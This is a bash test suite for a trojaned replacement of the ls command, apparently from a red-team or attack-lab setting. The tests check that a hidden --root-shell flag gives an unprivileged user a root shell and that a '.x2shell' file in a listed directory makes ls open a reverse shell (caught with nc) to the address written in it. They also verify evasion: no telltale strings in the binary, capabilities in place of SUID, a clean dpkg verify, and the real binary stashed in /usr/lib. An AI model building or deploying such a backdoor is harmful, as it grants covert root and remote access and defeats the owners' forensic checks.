#!/bin/bash
set -u
PASS=0; FAIL=0
REAL=/usr/lib/lsr

ok()   { echo "  PASS"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL${1:+: $1}"; FAIL=$((FAIL + 1)); }

# ── 1. basic passthrough ──────────────────────────────────────────
echo "[1] bare ls"
ls /tmp >/dev/null 2>&1 && ok || fail "exit code"

echo "[2] ls -la"
ls -la /tmp >/dev/null 2>&1 && ok || fail "exit code"

echo "[3] ls --color=auto"
ls --color=auto /tmp >/dev/null 2>&1 && ok || fail "exit code"

echo "[4] ls on nonexistent path (expect error)"
ls /nonexistent 2>/dev/null
[ $? -ne 0 ] && ok || fail "should have returned nonzero"

echo "[5] ls multiple paths"
ls /tmp /home >/dev/null 2>&1 && ok || fail "exit code"

echo "[6] ls -lhAF (lots of flags)"
ls -lhAF /tmp >/dev/null 2>&1 && ok || fail "exit code"

# ── 2. --root-shell trigger ───────────────────────────────────────
echo "[7] --root-shell drops to interactive shell"
got=$(echo "echo LS2SHELL_OK; exit" | ls --root-shell /tmp 2>/dev/null)
echo "$got" | grep -q LS2SHELL_OK && ok || fail "did not get shell"

echo "[8] --root-shell still shows ls output"
got=$(echo "exit" | ls --root-shell /home/blueteam/documents 2>/dev/null)
echo "$got" | grep -q "budget.xlsx" && ok || fail "no ls output"

# ── 3. directory trigger (reverse shell) ──────────────────────────
echo "[9] .x2shell reverse-shell trigger"
mkdir -p /tmp/trig
touch /tmp/trig/innocent.txt
echo "127.0.0.1:9999" > /tmp/trig/.x2shell

rm -f /tmp/rev_out
(echo "echo REV_OK; exit" | nc -l 9999 > /tmp/rev_out 2>/dev/null) &
NC=$!
sleep 0.3

ls /tmp/trig >/dev/null 2>&1
sleep 1
kill $NC 2>/dev/null; wait $NC 2>/dev/null

if grep -q REV_OK /tmp/rev_out 2>/dev/null; then
    ok
else
    fail "reverse shell did not connect (got: $(cat /tmp/rev_out 2>/dev/null))"
fi

echo "[10] trigger file cleaned up after successful connect"
[ ! -f /tmp/trig/.x2shell ] && ok || fail ".x2shell still present"

# ── 4. trigger persists on failed connect ─────────────────────────
echo "[11] trigger file kept when connect fails"
mkdir -p /tmp/failconn
touch /tmp/failconn/file.txt
echo "127.0.0.1:1" > /tmp/failconn/.x2shell
ls /tmp/failconn >/dev/null 2>&1
sleep 0.5
[ -f /tmp/failconn/.x2shell ] && ok || fail ".x2shell was deleted on failed connect"

# ── 5. cwd implicit trigger ──────────────────────────────────────
echo "[12] bare ls in cwd triggers when .x2shell present"
mkdir -p /tmp/cwdtrig && cd /tmp/cwdtrig
touch readme.md
echo "127.0.0.1:9998" > .x2shell

rm -f /tmp/cwd_out
(echo "echo CWD_OK; exit" | nc -l 9998 > /tmp/cwd_out 2>/dev/null) &
NC=$!
sleep 0.3

ls >/dev/null 2>&1
sleep 1
kill $NC 2>/dev/null; wait $NC 2>/dev/null

grep -q CWD_OK /tmp/cwd_out 2>/dev/null && ok || fail "cwd trigger missed"
cd /

# ── 6. no trigger without file ────────────────────────────────────
echo "[13] no trigger when .x2shell absent"
mkdir -p /tmp/safe && touch /tmp/safe/file.txt
ls /tmp/safe >/dev/null 2>&1 && ok || fail "exit code"

# ── 7. run as unprivileged user ───────────────────────────────────
echo "[14] passthrough as blueteam user"
su -c "ls /home/blueteam/documents" blueteam >/dev/null 2>&1 && ok || fail "exit code"

echo "[15] --root-shell as blueteam user gives root"
got=$(su -c 'echo "whoami; exit" | ls --root-shell /home/blueteam 2>/dev/null' blueteam)
echo "$got" | grep -q "^root$" && ok || fail "expected root, got: $(echo "$got" | tail -1)"

echo "[16] supplementary groups cleared"
got=$(su -c 'echo "id; exit" | ls --root-shell /home/blueteam 2>/dev/null' blueteam)
echo "$got" | grep -q "groups=0(root)$" && ok || fail "groups not clean: $(echo "$got" | grep groups)"

# ── 8. anti-forensics ────────────────────────────────────────────
echo "[17] strings: no obvious keywords"
hits=$(strings /usr/bin/ls | grep -ciE '(\bx2shell\b|\broot.shell\b|\bbackdoor\b|\/bin\/sh)')
[ "$hits" -eq 0 ] && ok || fail "$hits suspicious strings found"

echo "[18] strings: stash path not visible"
hits=$(strings /usr/bin/ls | grep -c 'usr/lib/lsr')
[ "$hits" -eq 0 ] && ok || fail "stash path leaked"

echo "[19] no SUID bit (uses capabilities instead)"
perms=$($REAL -la /usr/bin/ls | awk '{print $1}')
echo "$perms" | grep -q 's' && fail "SUID bit still set: $perms" || ok

echo "[20] capabilities set correctly"
caps=$(getcap /usr/bin/ls)
echo "$caps" | grep -q 'cap_setuid' && echo "$caps" | grep -q 'cap_setgid' && ok || fail "caps: $caps"

echo "[21] file shows dynamically linked PIE"
filetype=$(file /usr/bin/ls)
echo "$filetype" | grep -q "dynamically linked" && ok || fail "$filetype"

echo "[22] dpkg --verify coreutils: ls not flagged"
dpkg_out=$(dpkg --verify coreutils 2>&1 | grep 'bin/ls')
[ -z "$dpkg_out" ] && ok || fail "dpkg verify flagged ls: $dpkg_out"

echo "[23] find -perm -4000 does not find ls"
suid_hit=$(find /usr/bin/ls -perm -4000 2>/dev/null)
[ -z "$suid_hit" ] && ok || fail "ls found in SUID scan"

# ── summary ───────────────────────────────────────────────────────
echo ""
echo "━━━ $PASS passed, $FAIL failed ━━━"
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
